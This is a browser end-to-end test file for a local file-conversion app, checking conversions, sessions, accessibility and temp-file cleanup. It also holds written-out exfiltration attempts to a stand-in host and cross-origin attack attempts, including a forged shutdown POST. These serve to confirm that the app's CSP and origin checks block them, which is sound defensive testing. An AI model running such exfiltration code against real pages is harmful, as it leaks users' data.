/**
 * End-to-end test of Morph Local in a real browser: the packaged application, the bundled interface and a hostile
 * page. Uses the Chrome (or Edge) already installed; nothing is downloaded.
 *
 *   ./mvnw package -Prequire-web && cd web && npm run e2e
 *
 * JAVA_HOME selects the runtime; MORPH_E2E_CHANNEL=msedge selects the browser; MORPH_E2E_SHOTS=dir keeps screenshots.
 */
import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright-core';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const fixture = (name) => path.join(root, 'test-fixtures', name);
const target = path.join(root, 'morph-cli', 'target');
const distribution = readdirSync(target).find((n) => /^morph-[^.]+\..*(?<!\.zip)$/.test(n) && existsSync(path.join(target, n, 'morph', 'lib')));
assert.ok(distribution, 'Run ./mvnw package -Prequire-web first');
const java = process.env.JAVA_HOME ? path.join(process.env.JAVA_HOME, 'bin', 'java') : 'java';
const scratch = mkdtempSync(path.join(tmpdir(), 'morph-e2e-'));
const javaTemp = path.join(scratch, 'java-tmp');
mkdirSync(javaTemp);
const shots = process.env.MORPH_E2E_SHOTS;
if (shots) mkdirSync(shots, { recursive: true });

const morphArgs = (...args) => [
  '--enable-native-access=ALL-UNNAMED', `-Djava.io.tmpdir=${javaTemp}`,
  '-cp', path.join(target, distribution, 'morph', 'lib', '*'), 'dev.morph.cli.Main', ...args,
];

let failures = 0;
async function step(name, action) {
  try {
    await action();
    console.log(`ok    ${name}`);
  } catch (e) {
    failures++;
    console.log(`FAIL  ${name}\n      ${String(e.stack ?? e).split('\n').slice(0, 6).join('\n      ')}`);
  }
}

async function startMorph() {
  const child = spawn(java, morphArgs('web', '--no-browser'), { stdio: ['ignore', 'pipe', 'inherit'] });
  let output = '';
  child.stdout.setEncoding('utf8');
  const exited = new Promise((resolve) => child.on('exit', resolve));
  child.stdout.on('data', (chunk) => (output += chunk));
  const links = () => [...output.matchAll(/http:\/\/127\.0\.0\.1:\d+\/#code=\S+/g)].map((m) => m[0]);
  for (let i = 0; i < 200 && links().length === 0; i++) await new Promise((r) => setTimeout(r, 50));
  assert.ok(links().length, `morph web did not print a link: ${output}`);
  return { child, exited, links, output: () => output };
}

const temporaryFiles = () =>
  readdirSync(javaTemp, { recursive: true, withFileTypes: true })
    .filter((e) => e.isFile() && !e.name.startsWith('webp4j-'))
    .map((e) => path.join(e.parentPath, e.name));

const morph = await startMorph();
const link = morph.links()[0];
const origin = new URL(link).origin;
const browser = await chromium.launch({ channel: process.env.MORPH_E2E_CHANNEL ?? 'chrome', headless: true });
const context = await browser.newContext({ acceptDownloads: true, viewport: { width: 1100, height: 760 }, locale: 'pt-BR' });
const requests = [];
const blocked = [];
context.on('request', (r) => requests.push(r.url()));
context.on('requestfailed', (r) => blocked.push(r.url()));
const page = await context.newPage();
const consoleErrors = [];
page.on('console', (m) => m.type() === 'error' && consoleErrors.push(m.text()));
page.on('pageerror', (e) => consoleErrors.push(String(e)));

const row = (name) => page.locator('li.row', { hasText: name });
async function add(...names) {
  await page.locator('#picker').setInputFiles(names.map(fixture));
}
async function convert(locator) {
  await locator.getByRole('button', { name: 'Converter', exact: true }).click();
  await locator.getByRole('button', { name: /^Baixar/ }).waitFor({ timeout: 20_000 });
}
async function downloads(locator, count) {
  const received = [];
  const listener = (d) => received.push(d);
  page.on('download', listener);
  await locator.getByRole('button', { name: /^Baixar/ }).click();
  for (let i = 0; i < 100 && received.length < count; i++) await page.waitForTimeout(50);
  page.off('download', listener);
  return Promise.all(received.map(async (d) => ({ name: d.suggestedFilename(), bytes: readFileSync(await d.path()) })));
}
function cli(name, format, ...options) {
  const out = mkdtempSync(path.join(scratch, 'cli-'));
  const json = JSON.parse(execFileSync(java, morphArgs('convert', fixture(name), '--to', format, '--dir', out, '--json', ...options)));
  return json.results[0].outputs.map((o) => readFileSync(o.path));
}

try {
  await step('opens an authenticated session and removes the code from the address bar', async () => {
    await page.goto(link);
    await page.getByText('Solte arquivos aqui').waitFor();
    assert.equal(page.url(), `${origin}/`);
    if (shots) await page.screenshot({ path: path.join(shots, '1-empty.png') });
  });

  await step('identifies files by content and offers what the engine can do', async () => {
    await add('screenshot.png', 'quadrants.jpg', 'document-3-pages.pdf');
    await row('screenshot.png').getByText('PNG', { exact: true }).first().waitFor();
    assert.deepEqual(await row('screenshot.png').locator('.target select option').allTextContents(), ['JPEG', 'PDF', 'WebP']);
    assert.deepEqual(await row('document-3-pages.pdf').locator('.target select option').allTextContents(), ['JPEG', 'PNG']);
  });

  await step('PNG to WebP: the browser receives the same bytes the CLI writes', async () => {
    await row('screenshot.png').locator('.target select').selectOption('webp');
    await convert(row('screenshot.png'));
    const [file] = await downloads(row('screenshot.png'), 1);
    assert.equal(file.name, 'screenshot.webp');
    assert.ok(file.bytes.equals(cli('screenshot.png', 'webp')[0]));
    assert.equal(await row('screenshot.png').locator('.tile').textContent(), 'WebP');
  });

  await step('options chosen on screen reach the engine', async () => {
    const line = row('quadrants.jpg');
    await line.locator('.target select').selectOption('webp');
    await line.getByText('Opções e perdas').click();
    await line.getByLabel('Compressão sem perdas').check();
    if (shots) await page.screenshot({ path: path.join(shots, '2-options.png'), fullPage: true });
    await convert(line);
    const [file] = await downloads(line, 1);
    assert.ok(file.bytes.equals(cli('quadrants.jpg', 'webp', '-O', 'lossless=true')[0]));
    assert.ok(!file.bytes.equals(cli('quadrants.jpg', 'webp')[0]));
  });

  await step('PDF to PNG: one download per page, identical to the CLI', async () => {
    const line = row('document-3-pages.pdf');
    await line.locator('.target select').selectOption('png');
    await convert(line);
    const files = await downloads(line, 3);
    assert.deepEqual(files.map((f) => f.name).sort(), [1, 2, 3].map((n) => `document-3-pages-${n}.png`));
    const expected = cli('document-3-pages.pdf', 'png');
    files.sort((a, b) => a.name.localeCompare(b.name)).forEach((f, i) => assert.ok(f.bytes.equals(expected[i])));
  });

  await step('joins images into one PDF', async () => {
    await page.getByRole('button', { name: /^Juntar 2 imagens/ }).click();
    const line = row('2 imagens em um arquivo');
    await convert(line);
    const [file] = await downloads(line, 1);
    assert.equal(file.bytes.subarray(0, 5).toString(), '%PDF-');
    if (shots) await page.screenshot({ path: path.join(shots, '3-done.png'), fullPage: true });
  });

  await step('a file that is not what its name says is explained', async () => {
    await page.locator('#picker').setInputFiles({ name: 'falso.png', mimeType: 'image/png', buffer: Buffer.from('isto não é uma imagem') });
    await row('falso.png').getByText('não corresponde a nenhum formato').waitFor();
    await row('falso.png').getByRole('button', { name: /^Remover/ }).click();
  });

  await step('the session survives a reload of the tab', async () => {
    await page.reload();
    await page.getByText('Solte arquivos aqui').waitFor();
  });

  await step('a used link cannot open a second session', async () => {
    const other = await browser.newContext();
    const tab = await other.newPage();
    await tab.goto(link);
    await tab.getByText('Não foi possível abrir esta sessão').waitFor();
    await other.close();
  });

  await step('the link printed afterwards opens another window', async () => {
    const other = await browser.newContext();
    const tab = await other.newPage();
    await tab.goto(morph.links().at(-1));
    await tab.getByText('Solte arquivos aqui').waitFor();
    await other.close();
  });

  await step('every request of the interface stayed on this computer', async () => {
    // Edge shows its own download panel as a page; edge:// and chrome:// never touch the network.
    const foreign = requests.filter(
      (url) => !url.startsWith(`${origin}/`) && !url.startsWith(`blob:${origin}/`) && !/^(edge|chrome):\/\//.test(url),
    );
    assert.deepEqual(foreign, []);
    assert.ok(requests.length > 20, `${requests.length} requests observed`);
    assert.deepEqual(consoleErrors.filter((t) => !t.includes('422')), []);
  });

  await step('even code running inside the page cannot send data out (CSP)', async () => {
    const violations = await page.evaluate(async () => {
      const seen = [];
      document.addEventListener('securitypolicyviolation', (e) => seen.push(e.effectiveDirective));
      const attempts = {
        fetch: () => fetch('https://example.com/steal', { method: 'POST', body: 'x', mode: 'no-cors' }),
        beacon: () => navigator.sendBeacon('https://example.com/steal', 'x'),
        socket: () => new WebSocket('wss://example.com/steal'),
        image: () => (new Image().src = 'https://example.com/steal.png'),
        script: () => document.head.append(Object.assign(document.createElement('script'), { src: 'https://example.com/x.js' })),
        frame: () => document.body.append(Object.assign(document.createElement('iframe'), { src: 'https://example.com/' })),
        form: () => {
          const form = Object.assign(document.createElement('form'), { action: 'https://example.com/', method: 'post', target: '_blank' });
          document.body.append(form);
          form.submit();
        },
      };
      for (const attempt of Object.values(attempts)) {
        try {
          await attempt();
        } catch {
          // Being refused is the point.
        }
      }
      await new Promise((r) => setTimeout(r, 500));
      return seen;
    });
    for (const directive of ['connect-src', 'img-src', 'script-src-elem', 'frame-src', 'form-action']) {
      assert.ok(violations.includes(directive), `${directive} not enforced: ${violations}`);
    }
    assert.equal(violations.filter((d) => d === 'connect-src').length, 3, 'fetch, beacon and socket');
    const reached = requests.filter((u) => u.includes('example.com') && !blocked.includes(u));
    assert.deepEqual(reached, []);
  });

  await step('a hostile page on another origin gets nothing', async () => {
    const hostile = createServer((_, res) => res.setHeader('Content-Type', 'text/html').end('<!doctype html><title>evil</title>'));
    await new Promise((r) => hostile.listen(0, '127.0.0.1', r));
    const other = await browser.newContext();
    try {
      const tab = await other.newPage();
      const responses = [];
      other.on('response', (r) => r.url().startsWith(origin) && responses.push(r.status()));
      await tab.goto(`http://127.0.0.1:${hostile.address().port}/`);
      const outcome = await tab.evaluate(async (base) => {
        const attempt = async (path, init) => {
          try {
            const r = await fetch(base + path, init);
            return r.type === 'opaque' ? 'opaque' : `read ${r.status}`;
          } catch {
            return 'refused';
          }
        };
        return {
          read: await attempt('/api/v1/info', {}),
          page: await attempt('/', {}),
          credentials: await attempt('/api/v1/capabilities', { headers: { Authorization: 'Bearer guess' } }),
          simplePost: await attempt('/api/v1/shutdown', { method: 'POST', mode: 'no-cors', body: 'x' }),
        };
      }, origin);
      assert.deepEqual([outcome.read, outcome.page, outcome.credentials], ['refused', 'refused', 'refused']);
      await tab.setContent(`<iframe src="${origin}/"></iframe>`);
      await tab.waitForTimeout(500);
      assert.equal(await tab.frames()[1].locator('#root').count(), 0, 'must not be embeddable');
      assert.ok(responses.length > 0 && responses.every((s) => s === 403), `${responses}`);
      // The service is still up: the forged shutdown had no effect.
      await page.reload();
      await page.getByText('Solte arquivos aqui').waitFor();
    } finally {
      await other.close();
      hostile.close();
    }
  });

  await step('works in a dark, narrow screen and with the keyboard', async () => {
    const other = await browser.newContext({ viewport: { width: 390, height: 780 }, colorScheme: 'dark', locale: 'pt-BR' });
    const tab = await other.newPage();
    await tab.goto(morph.links().at(-1));
    await tab.getByText('Solte arquivos aqui').waitFor();
    await tab.locator('#picker').setInputFiles([fixture('alpha.png')]);
    const line = tab.locator('li.row', { hasText: 'alpha.png' });
    await line.locator('.target select').waitFor();
    await line.getByRole('button', { name: 'Converter', exact: true }).focus();
    await tab.keyboard.press('Enter');
    await line.getByRole('button', { name: 'Baixar' }).waitFor();
    await line.getByText('transparência foi substituída').waitFor();
    const overflow = await tab.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    assert.equal(overflow, 0, 'no horizontal scrolling');
    if (shots) await tab.screenshot({ path: path.join(shots, '4-dark-mobile.png'), fullPage: true });
    await other.close();
  });

  await step('closing from the interface ends the process and erases every temporary file', async () => {
    assert.ok(temporaryFiles().length > 1, 'there must be something to erase for this to prove anything');
    await page.getByRole('button', { name: 'Encerrar' }).click();
    await page.getByText('Morph encerrado').waitFor();
    assert.equal(await Promise.race([morph.exited, new Promise((r) => setTimeout(() => r('still running'), 15_000))]), 0);
    assert.deepEqual(temporaryFiles(), []);
  });
} finally {
  await browser.close();
  morph.child.kill();
  await morph.exited;
  rmSync(scratch, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
}
console.log(failures ? `\n${failures} step(s) failed` : '\nAll steps passed');
process.exit(failures ? 1 : 0);
